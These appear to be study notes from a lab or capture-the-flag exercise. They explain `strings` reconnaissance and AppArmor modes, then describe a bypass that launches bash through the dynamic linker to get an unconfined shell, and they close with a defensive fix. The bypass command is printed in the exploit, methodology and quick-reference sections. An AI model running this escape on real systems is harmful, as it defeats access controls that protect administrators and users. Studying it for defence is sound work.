##  Tool: `strings` Command

### What it does
```bash
strings /path/to/binary
```
- Extracts **human-readable text** from binary files
- Shows: dependencies, file paths, compilation info, functions

### Example from exercise
```bash
strings /usr/sbin/run_container
```
**Revealed:**
```
/lib64/ld-linux-x86-64.so.2   # Dynamic linker
/bin/bash                      # Shell being called
/opt/run_container.sh          # Target script
GCC: (Ubuntu 9.4.0) 9.4.0      # Compiler info
__stack_chk_fail              # Stack protection enabled
```

> `strings` is a **reconnaissance tool** - it tells you what a binary does without executing it

---

##  AppArmor Basics

### What is AppArmor?
- Linux **Mandatory Access Control (MAC)** system
- Restricts programs based on **per-program profiles**
- Works on **path-based** system

### Operating Modes

| Mode           | Behavior                   | Use Case                    |     |
| -------------- | -------------------------- | --------------------------- | --- |
| **Enforce**    | Blocks violations          | Production                  |     |
| **Complain**   | Logs but allows violations | Testing/Debugging           |     |
| **Unconfined** | No restrictions            | Default for unprofiled apps |     |

### Check AppArmor status
```bash
# Status overview
sudo aa-status

# Service status
sudo systemctl status apparmor

# Check if specific process is confined
ps auxZ | grep process_name

# Check process with mode indicator
ps auxZ
# Example output: /usr/sbin/ash (complain)
```

---

##  AppArmor Bypass Technique

### The Exploit
```bash
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```

### Why It Works

**Normal Execution:**
```
/bin/bash
    ↓
Kernel checks AppArmor profile for /bin/bash
    ↓
Profile enforced ✅
```

**Bypass:**
```
ld-linux-x86-64.so.2 /bin/bash
    ↓
Kernel checks AppArmor profile for LINKER (not bash)
    ↓
Linker has no/weak profile ❌
    ↓
Bash spawns UNCONFINED!
```

### Why This Happens
- AppArmor is **executable-centric**
- Profiles apply to the **binary being executed**
- The linker loads bash **after** AppArmor check
- Linker typically has **minimal or no profile**

---

##  Attacker Methodology

### Step-by-step attacker process:

1. **Reconnaissance**
   ```bash
   strings /usr/sbin/run_container
   ```

2. **Find key info**
   - Dynamic linker path
   - What shell/scripts are called
   - Binary capabilities

3. **Apply known technique**
   - Know that AppArmor profiles don't cover the linker
   - Execute shell via linker to bypass restrictions

4. **Gain unconfined shell**
   ```bash
   ld-linux.so.2 /bin/bash
   ```

---

## 📝 Quick Reference Card

```bash
# Recon
strings /path/to/binary

# Check AppArmor
ps auxZ | grep process

# Attack (for testing)
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash

```

---

## 🎯 Key Takeaway Summary

| Component | Vulnerability |
|-----------|---------------|
| `/bin/bash` | Has AppArmor profile ✅ |
| `ld-linux.so` | No/weak profile ❌ |
| `run_container` | Wrapper script, inherits restrictions |
| **Result** | Linker becomes **escape hatch** |

**The fix:** Always profile the interpreter/linker, not just the application!